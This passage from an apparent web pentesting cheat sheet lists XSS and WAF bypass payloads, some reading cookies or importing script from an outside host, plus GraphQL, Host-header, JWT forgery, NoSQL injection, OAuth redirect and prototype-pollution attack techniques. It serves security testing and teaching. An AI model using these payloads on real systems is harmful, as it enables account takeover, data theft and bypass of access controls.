<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HRef</span><span class="o">=</span><span class="s">//X55.is</span> <span class="na">AutoFocus</span> <span class="err">%</span><span class="na">26</span><span class="err">%</span><span class="na">2362</span> <span class="na">OnFocus</span><span class="err">%</span><span class="na">0C</span><span class="o">=</span><span class="s">import(href)</span><span class="p">&gt;</span>
</code></pre></div>
<p>Bypass CloudFlare:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert&amp;#0000000040document.cookie)</span><span class="p">&gt;</span>
</code></pre></div>
<p>Every HTML tag has the <code>baseURI</code> property. Using <code>&lt;base&gt;</code> allows you to change the <code>baseURI</code>:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">base</span> <span class="na">href</span><span class="o">=</span><span class="s">x:alert(1)</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">eval(baseURI)</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">1</span> <span class="na">style</span><span class="o">=</span><span class="s">display:block</span> <span class="na">autofocus</span><span class="p">&gt;</span>
</code></pre></div>
<p>No spaces and quotes abusing regex:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">parent</span> <span class="err">[/</span><span class="na">al</span><span class="err">/.</span><span class="na">source</span><span class="err">+/</span><span class="na">ert</span><span class="err">/.</span><span class="na">source</span><span class="err">]</span> <span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
</code></pre></div>
<p>No spaces, quotes and + sign abusing regex:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">parent(/al/.source.concat(/ert/.source)]</span> <span class="err">(</span><span class="na">2</span><span class="err">)</span><span class="p">&gt;</span>
</code></pre></div>
<p>No spaces and using <strong>Zero Width No-Break Space html entity</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="err">/</span><span class="na">onerror</span><span class="o">=</span><span class="s">alert&amp;#xFEFF;(1)</span><span class="p">&gt;</span>
</code></pre></div>
<p>Using <strong>Reflection</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">nope</span><span class="o">=</span><span class="s">"%26quot;x%26quot;"</span><span class="na">onmouseover</span><span class="o">=</span><span class="s">"Reflect.get(frames,'ale'+'rt')</span>
<span class="s">(Reflect get(document,'coo'+ 'kie'))"</span><span class="p">&gt;</span>
</code></pre></div>
<p>Using No spaces + case variation + <strong>double assignment</strong>:</p>
<div class="highlight"><pre><span></span><code>"&gt;<span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">"X"</span><span class="err">/</span><span class="na">OnErRor</span><span class="o">=</span><span class="s">x=alert`XSS`</span><span class="p">&gt;</span><span class="err">&lt;</span>!-
</code></pre></div>
<p>No <code>&gt;</code> and  char limit to 35:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">"alert(1)"</span> <span class="err">&lt;=""</span> <span class="na">svg</span><span class="o">=</span><span class="s">""</span>
</code></pre></div>
<p>HTML encoding:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span><span class="err">/</span><span class="na">href</span><span class="o">=</span><span class="s">j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;&amp;lpar;a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(document.domain)&amp;rpar;</span><span class="p">&gt;</span>clickme<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<p>Use <code>top</code>, the top-level window object in browser:</p>
<div class="highlight"><pre><span></span><code>javascript:top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);

# URL Encoded with some LF
%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
</code></pre></div>
<p>Encoding bypasses:</p>
<div class="highlight"><pre><span></span><code>%C0%BCscript&gt;alert(1)<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
%E0%80%BCscript&gt;alert(1)<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
%F0%80%80%BCscript&gt;alert(1)<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
%F8%80%80%80%BCscript&gt;alert(1)<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
%FC%80%80%80%80%BCscript&gt;alert(1)<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>
<p>Miscellaneous payloads:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">"height:100px"</span> <span class="na">onwheel</span><span class="o">=</span><span class="s">"self['al'+'ert'](self['ev'+'al']</span>
<span class="s">('docu'+'ment.coo'+'kie')"</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>

# Close a JS Comment with svg data
<span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;</span>  
<span class="err">&lt;</span>&ZeroWidthSpace;script&gt;  
/*  
<span class="cp">&lt;![CDATA[*]]&gt;&lt;![CDATA[/]]&gt;</span>alert(1)-/\*/  
<span class="err">&lt;</span>&ZeroWidthSpace;/script&gt;
</code></pre></div>
<p>Useful resources:</p>
<ul>
<li><a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml">XSSChallengeWiki</a></li>
</ul>
<h2 id="dom-clobbering_1">DOM Clobbering</h2>
<p>It's possible to generate <strong>global variables inside the JS context</strong> with the attributes <code>id</code> and <code>name</code> in HTML tags.</p>
<p>Reference: <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering">DOM Clobbering - Hacktricks</a></p>
<p>The implementation for the <code>toString()</code> for an <code>a</code> element is its <code>href</code> attribute.</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Clobber an array/object --&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="na">name</span><span class="o">=</span><span class="s">y</span> <span class="na">href</span><span class="o">=</span><span class="s">somevalue</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="mf">1</span><span class="p">])</span><span class="w"> </span><span class="c1">//Output: somevalue</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">)</span><span class="w"> </span><span class="c1">//Output: somevalue</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- Clobber a 2nd level object with &lt;form&gt; --&gt;</span>

<span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="na">name</span><span class="o">=</span><span class="s">y</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">z</span> <span class="na">value</span><span class="o">=</span><span class="s">somevalue</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="c1">//Output: somevalue</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>
<p><strong>DOM Purify</strong> bypass: DOMPurify allows you to use the <code>cid:</code> protocol, which <strong>does not URL-encode double-quotes</strong>. This means you can <strong>inject an encoded double-quote that will be decoded at runtime</strong>. </p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span> <span class="na">name</span><span class="o">=</span><span class="s">avatar</span> <span class="na">href</span><span class="o">=</span><span class="s">"cid:&amp;quot;onerror=alert(1)//"</span><span class="p">&gt;</span>
</code></pre></div>
<p>In the previous snippet the HTML encoded <code>&amp;quot;</code> will be <strong>decoded on runtime</strong> and <strong>escape</strong> from the attribute value to <strong>create</strong> the <code>**onerror**</code> event.</p>
<h2 id="graphql">GraphQL</h2>
<p>Common GraphQL endpoints:</p>
<div class="highlight"><pre><span></span><code>/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/graphql/v1
/api/v1
/api/graphql/v1
/graphql/api/v1
/graphql/graphql/v1
</code></pre></div>
<h3 id="universal-query">Universal Query</h3>
<p>If you send <code>query{__typename}</code> to any GraphQL endpoint, it will include the string <code>{"data": {"__typename": "query"}}</code> somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.
- Every GraphQL endpoint has a reserved field called <code>__typename</code> that returns the queried object's type as a string.
- GraphQL services will often respond to any non-GraphQL request with a "query not present" or other similar errors</p>
<h3 id="enumerate-endpoint-accepted-methods">Enumerate endpoint accepted methods</h3>
<p>Generally, GraphQL endpoint accept POST requests with <code>application/json</code> content-type.
However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of <code>x-www-form-urlencoded</code>.</p>
<ul>
<li>To enumerate other accepted methods, try resending the universal query using alternative HTTP methods.</li>
</ul>
<h3 id="introspection">Introspection</h3>
<p>Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.</p>
<p>It is best practice for introspection to be disabled in production environments, but this advice is not always followed. Following the GraphQL query to probe if introspection is enabled: <code>{ "query": "{__schema{queryType{name}}}" }</code></p>
<p>If introspection is enabled, run the following query to return full details on queries, mutations, subscriptions, types and fragments:</p>
<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="c1">#Full introspection query</span>

<span class="w">    </span><span class="n">query</span><span class="w"> </span><span class="n">IntrospectionQuery</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">__schema</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">queryType</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">name</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">mutationType</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">name</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">subscriptionType</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">name</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">types</span><span class="w"> </span><span class="p">{</span>
<span class="w">             </span><span class="o">...</span><span class="n">FullType</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">directives</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">name</span>
<span class="w">                </span><span class="n">description</span>
<span class="w">                </span><span class="n">args</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="o">...</span><span class="n">InputValue</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">onOperation</span><span class="w">  </span><span class="c1">#Often needs to be deleted to run query</span>
<span class="w">            </span><span class="n">onFragment</span><span class="w">   </span><span class="c1">#Often needs to be deleted to run query</span>
<span class="w">            </span><span class="n">onField</span><span class="w">      </span><span class="c1">#Often needs to be deleted to run query</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">fragment</span><span class="w"> </span><span class="n">FullType</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">__Type</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">kind</span>
<span class="w">        </span><span class="n">name</span>
<span class="w">        </span><span class="n">description</span>
<span class="w">        </span><span class="n">fields</span><span class="p">(</span><span class="n">includeDeprecated</span><span class="p">:</span><span class="w"> </span><span class="bp">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">name</span>
<span class="w">            </span><span class="n">description</span>
<span class="w">            </span><span class="n">args</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">...</span><span class="n">InputValue</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">type</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">...</span><span class="n">TypeRef</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="n">isDeprecated</span>
<span class="w">            </span><span class="n">deprecationReason</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">inputFields</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">...</span><span class="n">InputValue</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">interfaces</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">...</span><span class="n">TypeRef</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">enumValues</span><span class="p">(</span><span class="n">includeDeprecated</span><span class="p">:</span><span class="w"> </span><span class="bp">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">name</span>
<span class="w">            </span><span class="n">description</span>
<span class="w">            </span><span class="n">isDeprecated</span>
<span class="w">            </span><span class="n">deprecationReason</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">possibleTypes</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">...</span><span class="n">TypeRef</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">fragment</span><span class="w"> </span><span class="n">InputValue</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">__InputValue</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">name</span>
<span class="w">        </span><span class="n">description</span>
<span class="w">        </span><span class="n">type</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">...</span><span class="n">TypeRef</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">defaultValue</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">fragment</span><span class="w"> </span><span class="n">TypeRef</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">__Type</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">kind</span>
<span class="w">        </span><span class="n">name</span>
<span class="w">        </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">kind</span>
<span class="w">            </span><span class="n">name</span>
<span class="w">            </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">kind</span>
<span class="w">                </span><span class="n">name</span>
<span class="w">                </span><span class="n">ofType</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">kind</span>
<span class="w">                    </span><span class="n">name</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>
<p><strong>Note</strong>: If introspection is enabled but the above query doesn't run, try removing the <code>onOperation</code>, <code>onFragment</code>, and <code>onField</code> directives from the query structure.</p>
<p>If introspection is protected by regex-based control such as blocking the query if matches <code>__schema{</code>, it can be bypassed by adding a new line after <code>__schema</code>.
Another possible bypass is to try changing method from <code>POST</code> to <code>GET</code> or change the content-type from <code>application/json</code> to <code>x-www-form-urlencoded</code>.
<strong>Try also combining both the bypasses.</strong></p>
<p>If introspection is disabled, take a look at <a href="https://github.com/nikitastupin/clairvoyance">Clairovoyance</a>. Clairvoyance helps to obtain GraphQL API schema even if the introspection is disabled using <strong>suggestions</strong> (when enabled, suggestions return messages such as "There is no entry for 'productInfo'. Did you mean 'productInformation' instead?" that can help mapping the schema even though the introspection is disabled).</p>
<h3 id="rate-limit-bypass">Rate limit bypass</h3>
<p>It's possible to use aliases to return multiple instances of the same type of object in one request.
Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because <strong>aliases effectively enable you to send multiple queries in a single HTTP message</strong>, they can bypass this restriction.</p>
<h2 id="host-header-attacks_1">Host Header Attacks</h2>
<p>Useful resources: <a href="https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html">Password Reset Poisoning</a></p>
<p>The <code>X-Forwarded-Host</code> (XFH) header is a standard header for identifying the original host requested by the client generally used when the original requested service is behind reverse proxies (load balancers, CDNs). 
It could be enabled by default and exploitable to perform Host Header injections.</p>
<p>Following some other headers with similar purposes as <code>X-Forwarded-Host</code>:</p>
<ul>
<li><code>X-Host</code></li>
<li><code>X-Forwarded-Server</code></li>
<li><code>X-HTTP-Host-Override</code></li>
<li><code>Forwarded</code></li>
</ul>
<p>Web servers allow a port to be specified in the Host header, but ignore it for the purpose of deciding which virtual host to pass the request to; it's possible to inject an evil host with the following payload:</p>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/targeturl</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">legitmhostname:@evilhostname</span>
</code></pre></div>
<p>Sometimes it's possible to bypass IP-based restrictions using the <code>X-Forwarded-For</code> or <code>X-Real-IP</code> headers.</p>
<p>Another possible approach is to try adding duplicate Host headers, useful when different system are involved and their host header handling is different:</p>
<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/targeturl</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable-website.com # &lt;--- Correctly routes the request</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">bad-stuff-here # &lt;--- used by the second system</span>
</code></pre></div>
<p>A variant to this attack is to indent an host header since it could be ignored by the first system since it's not <code>^Host: .*$</code> but processed by the second one.</p>
<p>Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results and route the request to an upstream URL.</p>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">@private-intranet/example</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>
<ul>
<li>The resulting upstream URL will be http://backend-server@private-intranet/example</li>
</ul>
<p>Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection.</p>
<ul>
<li>send an innocent-looking initial request followed by a malicious one down the <strong>same connection</strong>.</li>
</ul>
<h3 id="javascript-injection">Javascript Injection</h3>
<p>Common sinks:</p>
<div class="highlight"><pre><span></span><code><span class="nb">eval</span><span class="p">()</span>
<span class="nb">Function</span><span class="p">()</span>
<span class="nx">setTimeout</span><span class="p">()</span>
<span class="nx">setInterval</span><span class="p">()</span>
<span class="nx">setImmediate</span><span class="p">()</span>
<span class="nx">execCommand</span><span class="p">()</span>
<span class="nx">execScript</span><span class="p">()</span>
<span class="nx">msSetImmediate</span><span class="p">()</span>
<span class="nx">range</span><span class="p">.</span><span class="nx">createContextualFragment</span><span class="p">()</span>
<span class="nx">crypto</span><span class="p">.</span><span class="nx">generateCRMFRequest</span><span class="p">()</span>
</code></pre></div>
<h2 id="jwt-attacks_1">JWT Attacks</h2>
<ul>
<li>Check if the application accepts tokens with invalid signature.</li>
<li>Check if the application accepts tokens with no signature by setting the <code>alg</code> header parameter to <code>none</code>.</li>
<li>Try bruteforcing the JWT secret signing key.</li>
<li>Header parameter injections:<ul>
<li>via the <code>jwk</code> header parameter.</li>
<li>via the <code>jku</code> header parameter.</li>
<li>via the <code>kid</code> header parameter; it could be vulnerable to path-traversal or SQLi. If vulnerable to path traversal, try using <code>/dev/null</code> as key in order to sign the JWT with an empty string.</li>
<li>via <code>cty</code> header parameter to change the content type to <code>text/xml</code> or <code>application/x-java-serialized-object</code>, which can potentially enable new vectors for XXE and deserialization attacks. </li>
</ul>
</li>
<li>Try algorithm confusion attacks.</li>
</ul>
<h3 id="algorithm-confusion-attacks">Algorithm Confusion Attacks</h3>
<p>Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers. If this case isn't handled properly, this may enable attackers to forge valid JWTs containing arbitrary values without needing to know the server's secret signing key. </p>
<p>Generally developers assume that the application will exclusively handle JWTs signed using an asymmetric algorithm like RS256. Due to this flawed assumption, they may always pass a fixed public key to the method that verifies a JWT.</p>
<ul>
<li>If the server receives a token signed using a symmetric algorithm like HS256, the library that implements the validation method might treat the public key as an HMAC secret. </li>
<li>This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature. </li>
</ul>
<p>*<strong>Note</strong>: The public key used to sign the token must be absolutely identical to the public key stored on the server. This includes using the same format (such as X.509 PEM) and preserving any non-printing characters like newlines. </p>
<ul>
<li>It may be needed to experiment with different formatting in order for this attack to work.</li>
</ul>
<p>JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as <code>/.well-known/jwks.json</code>. JWK Sets may contain public keys if asymmetric algorithms are used to sign an application's JWTs.</p>
<p>If public key is not publicly exposed, it's possible to derive it by using the <code>jwt_forgery.py</code> from the <a href="https://github.com/silentsignal/rsa_sign2n">rsa2sign</a> repository. Alternatively, the following uses the previously mentioned script to derive some possible keys and generate each of them to sign a JWT token:</p>
<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>portswigger/sig2n<span class="w"> </span>&lt;token1&gt;<span class="w"> </span>&lt;token2&gt;<span class="w"> </span>
</code></pre></div>
<p>For each possible key, the scripts outputs:</p>
<ul>
<li>A Base64-encoded PEM key in both X.509 and PKCS1 format.</li>
<li>A forged JWT signed using each of these keys.</li>
</ul>
<h2 id="nosql-injection-nosqli_1">NoSQL Injection (NoSQLi)</h2>
<p>Fuzz strings to check if any possible NoSQLi in <code>$where</code>:</p>
<div class="highlight"><pre><span></span><code>'"`{
;$Foo}
$Foo \xYZ
</code></pre></div>
<p>Add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored:</p>
<div class="highlight"><pre><span></span><code>https://insecure-website.com/product/lookup?category=fizzy'%00

results in: this.category == 'fizzy'\u0000' &amp;&amp; this.released == 1

' &amp;&amp; this.released == 1 are ignored
</code></pre></div>
<p>When operator injection is available, it's possible to enumerate an object field name by injection the following payload:</p>
<div class="highlight"><pre><span></span><code>"$where":"Object.keys(this)[0].match('^.{0}a.*')"
</code></pre></div>
<p><strong>Note</strong>: field at position 0 should generally be <code>_id</code></p>
<h2 id="oauth2">OAuth2</h2>
<p>Useful resource: <a href="https://portswigger.net/web-security/oauth">https://portswigger.net/web-security/oauth</a></p>
<p>Interesting endpoints:</p>
<div class="highlight"><pre><span></span><code>/.well-known/oauth-authorization-server
/.well-known/openid-configuration
</code></pre></div>
<p>These will often return a JSON configuration file containing key information, such as details of additional features that may be supported</p>
<p>When auditing an OAuth flow, you should try experimenting with the <code>redirect_uri</code> parameter to understand how it is being validated:</p>
<ul>
<li>Check if the domains are validated by checking only the starting value of the provided string: Es: <code>redirect_uri.startsWith("&lt;valid domain&gt;")</code></li>
<li>By appending extra-values to the default <code>redirect_uri</code> you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. Es: <code>https://default-host.com &amp;@foo.evil-user.net#@bar.evil-user.net/</code></li>
<li>Server-side parameter pollution: <code>https://oauth-authorization-server.com/?client_id=123&amp;redirect_uri=client-app.com/callback&amp;redirect_uri=evil-user.net</code></li>
<li>Some servers also give special treatment to <code>localhost</code>: try something like <code>localhost.evil-user.net</code></li>
<li>Try change <code>response_mode</code> from <code>query</code> to <code>fragment</code>; can sometimes completely alter the parsing of the <code>redirect_uri</code>, opening to new possibilities</li>
</ul>
<p><strong>Scope Upgrade</strong></p>
<p>When dealing with the authorization code flow, try tampering the <code>scope</code> parameter by adding some other scopes (such as <code>profile</code>) :</p>
<ul>
<li>If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope</li>
</ul>
<p>For the implicit flow, since the access token is sent via the browser, an attacker could simply steal an access token and send a normal browser-based request to the OAuth service's <code>/userinfo</code> endpoint, manually adding a new <code>scope</code> parameter in the process.</p>
<ul>
<li>The OAuth service should validate this <code>scope</code> value against the one that was used when generating the token, but this isn't always the case</li>
</ul>
<p><strong>OpenID Connect</strong></p>
<p>OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation.
OpenID Connect services use an identical set of scopes for all the providers (instead of different scopes for different providers as in OAuth). In order to use OpenID Connect, the client application must specify the scope <code>openid</code> in the authorization request.</p>
<p>Following the list of the other scopes to specify after <code>openid</code>:</p>
<ul>
<li><code>profile</code></li>
<li><code>email</code></li>
<li><code>address</code></li>
<li><code>phone</code></li>
</ul>
<p>OpenID adds another <code>response_type</code>: the <code>id_token</code>, that contains a JSON web token (JWT) signed with a JSON web signature (JWS).</p>
<p>You may also be able to access the configuration file from the standard endpoint <code>/.well-known/openid-configuration</code>.</p>
<p>If the application allows <strong>dynamic client registration</strong>, check if it is <em>unprotected</em> (does not require authentication):</p>
<ul>
<li>Generally, an OpenID provider should require the client application to authenticate itself.</li>
<li>Allowing dynamic client registration without any authentication enables an attacker to register their own malicious client application, potentially leading to vulnerabilities like SSRF if URLs provided in the registration request are accessed by the OpenID provider.</li>
</ul>
<p>Example of OpenId Connect client registration:</p>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/openid/register</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">oauth-authorization-server.com</span>
<span class="na">Authorization</span><span class="o">:</span> <span class="l">Bearer ab12cd34ef56gh89</span>

<span class="p">{</span>
<span class="w">    </span><span class="nt">"application_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"web"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"redirect_uris"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s2">"https://client-app.com/callback"</span><span class="p">,</span>
<span class="w">        </span><span class="s2">"https://client-app.com/callback2"</span>
<span class="w">        </span><span class="p">],</span>
<span class="w">    </span><span class="nt">"client_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"My Application"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"logo_uri"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://client-app.com/logo.png"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"token_endpoint_auth_method"</span><span class="p">:</span><span class="w"> </span><span class="s2">"client_secret_basic"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"jwks_uri"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://client-app.com/my_public_keys.jwks"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"userinfo_encrypted_response_alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RSA1_5"</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"userinfo_encrypted_response_enc"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A128CBC-HS256"</span><span class="p">,</span>
<span class="w">    </span><span class="err">&hellip;</span>
<span class="p">}</span>
</code></pre></div>
<p>Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. If this feature is supported, you can send a single <code>request_uri</code> parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values.</p>
<ul>
<li>Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the <code>redirect_uri</code>.</li>
</ul>
<h2 id="prototype-pollution">Prototype Pollution</h2>
<p>Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys:</p>
<ul>
<li>Due to the special meaning of <code>__proto__</code> in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way. </li>
<li>Common pollution target is <code>Object.prototype</code>.</li>
</ul>
<p>Generic probe with URL source:</p>
<ul>
<li>Try polluting <code>Object.prototype</code> by injecting an arbitrary property via the query string: <code>/?__proto__[foo]=bar</code> and then check in DevConsole if the pollution has been successfull.</li>
</ul>
<p>If <code>__proto__</code> is stripped from any user controllable input, try polluting via the constructor.</p>
<ul>
